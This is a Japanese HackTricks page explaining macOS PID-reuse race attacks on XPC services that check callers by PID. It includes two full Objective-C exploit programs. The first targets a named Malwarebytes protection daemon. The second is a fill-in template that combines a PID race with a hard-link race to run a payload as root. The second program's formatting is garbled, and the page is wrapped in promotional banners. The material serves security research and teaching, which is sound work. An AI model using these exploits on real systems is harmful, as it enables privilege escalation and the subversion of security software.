# macOS PID Reuse

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を通じてゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**する。
* **ハッキングトリックを共有するには、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>

## PID再利用

macOSの**XPCサービス**が**PID**に基づいて呼び出し元プロセスをチェックしている場合、**PID再利用攻撃**の脆弱性があります。この攻撃は、**悪用**される**機能を悪用**して**XPCサービスにメッセージを送信**し、その**直後**に\*\*`posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ)`**を実行する**レースコンディション\*\*に基づいています。

この関数は、**許可されたバイナリがPIDを所有**するようにしますが、**悪意のあるXPCメッセージは**ちょうど**その前に送信**されています。したがって、**XPC**サービスが**PID**を使用して**送信元を認証**し、**`posix_spawn`の実行後にそれをチェック**する場合、それは**認証された**プロセスから来たと思うでしょう。

### 攻撃例

関数\*\*`shouldAcceptNewConnection`**またはそれによって呼び出される関数が**`auditToken`**を呼び出さずに**`processIdentifier`**を呼び出している場合、それは**プロセスPID\*\*を検証している可能性が高いです。\
たとえば、この画像（参照から取得）のように：

<figure><img src="../../../../../../.gitbook/assets/image (4) (1) (1) (1) (2).png" alt="https://wojciechregula.blog/images/2020/04/pid.png"><figcaption></figcaption></figure>

この攻撃例をチェックしてください（再度、参照から取得）：

* **複数のフォークを生成**するもの
* 各フォークは\*\*`posix_spawn`**を実行しながら**XPCサービスにペイロード**を**送信\*\*します。

{% hint style="danger" %}
攻撃を実行するには、` export`` ` \*\*`OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES`\*\*を設定するか、攻撃内に次のように記述することが重要です：

```objectivec
asm(".section __DATA,__objc_fork_ok\n"
"empty:\n"
".no_dead_strip empty\n");
```
{% endhint %}

**`NSTasks`** を使用した最初のオプションは、子プロセスを起動して RC を悪用する引数です。

```objectivec
// Code from https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/
// gcc -framework Foundation expl.m -o expl

#import <Foundation/Foundation.h>
#include <spawn.h>
#include <sys/stat.h>

#define RACE_COUNT 32
#define MACH_SERVICE @"com.malwarebytes.mbam.rtprotection.daemon"
#define BINARY "/Library/Application Support/Malwarebytes/MBAM/Engine.bundle/Contents/PlugIns/RTProtectionDaemon.app/Contents/MacOS/RTProtectionDaemon"

// allow fork() between exec()
asm(".section __DATA,__objc_fork_ok\n"
"empty:\n"
".no_dead_strip empty\n");

extern char **environ;

// defining necessary protocols
@protocol ProtectionService
- (void)startDatabaseUpdate;
- (void)restoreApplicationLauncherWithCompletion:(void (^)(BOOL))arg1;
- (void)uninstallProduct;
- (void)installProductUpdate;
- (void)startProductUpdateWith:(NSUUID *)arg1 forceInstall:(BOOL)arg2;
- (void)buildPurchaseSiteURLWithCompletion:(void (^)(long long, NSString *))arg1;
- (void)triggerLicenseRelatedChecks;
- (void)buildRenewalLinkWith:(NSUUID *)arg1 completion:(void (^)(long long, NSString *))arg2;
- (void)cancelTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)startTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)unredeemLicenseKeyWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)applyLicenseWith:(NSUUID *)arg1 key:(NSString *)arg2 completion:(void (^)(long long))arg3;
- (void)controlProtectionWithRawFeatures:(long long)arg1 rawOperation:(long long)arg2;
- (void)restartOS;
- (void)resumeScanJob;
- (void)pauseScanJob;
- (void)stopScanJob;
- (void)startScanJob;
- (void)disposeOperationBy:(NSUUID *)arg1;
- (void)subscribeTo:(long long)arg1;
- (void)pingWithTag:(NSUUID *)arg1 completion:(void (^)(NSUUID *, long long))arg2;
@end

void child() {

// send the XPC messages
NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ProtectionService)];
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:MACH_SERVICE options:NSXPCConnectionPrivileged];
xpcConnection.remoteObjectInterface = remoteInterface;

[xpcConnection resume];
[xpcConnection.remoteObjectProxy restartOS];

char target_binary[] = BINARY;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

bool create_nstasks() {

NSString *exec = [[NSBundle mainBundle] executablePath];
NSTask *processes[RACE_COUNT];

for (int i = 0; i < RACE_COUNT; i++) {
processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[ @"imanstask" ]];
}

int i = 0;
struct timespec ts = {
.tv_sec = 0,
.tv_nsec = 500 * 1000000,
};

nanosleep(&ts, NULL);
if (++i > 4) {
for (int i = 0; i < RACE_COUNT; i++) {
[processes[i] terminate];
}
return false;
}

return true;
}

int main(int argc, const char * argv[]) {

if(argc > 1) {
// called from the NSTasks
child();

} else {
NSLog(@"Starting the race");
create_nstasks();
}

return 0;
}
```

この例では、\*\*\`fork\`\*\*を使用して\*\*PID競合状態を悪用する子プロセスを起動\*\*し、その後\*\*ハードリンクを介した別の競合状態を悪用\*\*します。 \`\`\`objectivec // export OBJC\_DISABLE\_INITIALIZE\_FORK\_SAFETY=YES // gcc -framework Foundation expl.m -o expl

\#include \<Foundation/Foundation.h> #include \<spawn.h> #include \<pthread.h>

// TODO: CHANGE PROTOCOL AND FUNCTIONS @protocol HelperProtocol

* (void)DoSomething:(void (^)(\_Bool))arg1; @end

// Global flag to track exploitation status bool pwned = false;

/\*\*

* Continuously overwrite the contents of the 'hard\_link' file in a race condition to make the
* XPC service verify the legit binary and then execute as root out payload. \*/ void \*check\_race(void \*arg) { while(!pwned) { // Overwrite with contents of the legit binary system("cat ./legit\_bin > hard\_link"); usleep(50000);

// Overwrite with contents of the payload to execute // TODO: COMPILE YOUR OWN PAYLOAD BIN system("cat ./payload > hard\_link"); usleep(50000); } return NULL; }

void child\_xpc\_pid\_rc\_abuse(){ // TODO: INDICATE A VALID BIN TO BYPASS SIGN VERIFICATION #define kValid "./Legit Updater.app/Contents/MacOS/Legit" extern char \*\*environ;

// Connect with XPC service // TODO: CHANGE THE ID OF THE XPC TO EXPLOIT NSString\* service\_name = @"com.example.Helper"; NSXPCConnection\* connection = \[\[NSXPCConnection alloc] initWithMachServiceName:service\_name options:0x1000]; // TODO: CNAGE THE PROTOCOL NAME NSXPCInterface\* interface = \[NSXPCInterface interfaceWithProtocol:@protocol(HelperProtocol)]; \[connection setRemoteObjectInterface:interface]; \[connection resume];

id obj = \[connection remoteObjectProxyWithErrorHandler:^(NSError\* error) { NSLog(@"\[-] Something went wrong"); NSLog(@"\[-] Error: %@", error); }];

NSLog(@"obj: %@", obj); NSLog(@"conn: %@", connection);

// Call vulenrable XPC function // TODO: CHANEG NAME OF FUNCTION TO CALL \[obj DoSomething:^(\_Bool b){ NSLog(@"Response, %hdd", b); }];

// Change current process to the legit binary suspended char target\_binary\[] = kValid; char \*target\_argv\[] = {target\_binary, NULL}; posix\_spawnattr\_t attr; posix\_spawnattr\_init(\&attr); short flags; posix\_spawnattr\_getflags(\&attr, \&flags); flags |= (POSIX\_SPAWN\_SETEXEC | POSIX\_SPAWN\_START\_SUSPENDED); posix\_spawnattr\_setflags(\&attr, flags); posix\_spawn(NULL, target\_binary, NULL, \&attr, target\_argv, environ); }

/\*\*

* Function to perform the PID race condition using children calling the XPC exploit. \*/ void xpc\_pid\_rc\_abuse() { #define RACE\_COUNT 1 extern char \*\*environ; int pids\[RACE\_COUNT];

// Fork child processes to exploit for (int i = 0; i < RACE\_COUNT; i++) { int pid = fork(); if (pid == 0) { // If a child process child\_xpc\_pid\_rc\_abuse(); } printf("forked %d\n", pid); pids\[i] = pid; }

// Wait for children to finish their tasks sleep(3);

// Terminate child processes for (int i = 0; i < RACE\_COUNT; i++) { if (pids\[i]) { kill(pids\[i], 9); } } }

int main(int argc, const char \* argv\[]) { // Create and set execution rights to 'hard\_link' file system("touch hard\_link"); system("chmod +x hard\_link");

// Create thread to exploit sign verification RC pthread\_t thread; pthread\_create(\&thread, NULL, check\_race, NULL);

while(!pwned) { // Try creating 'download' directory, ignore errors system("mkdir download 2>/dev/null");

// Create a hardlink // TODO: CHANGE NAME OF FILE FOR SIGN VERIF RC system("ln hard\_link download/legit\_bin");

xpc\_pid\_rc\_abuse(); usleep(10000);

// The payload will generate this file if exploitation is successfull if (access("/tmp/pwned", F\_OK ) == 0) { pwned = true; } }

return 0; }

```
## 参考文献

* [https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/](https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/)
* [https://saelo.github.io/presentations/warcon18\_dont\_trust\_the\_pid.pdf](https://saelo.github.io/presentations/warcon18\_dont\_trust\_the\_pid.pdf)

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong>を使用して、ゼロからヒーローまでAWSハッキングを学びましょう！</summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手してください
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションをご覧ください
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
* **HackTricks**および**HackTricks Cloud**のgithubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。

</details>
```
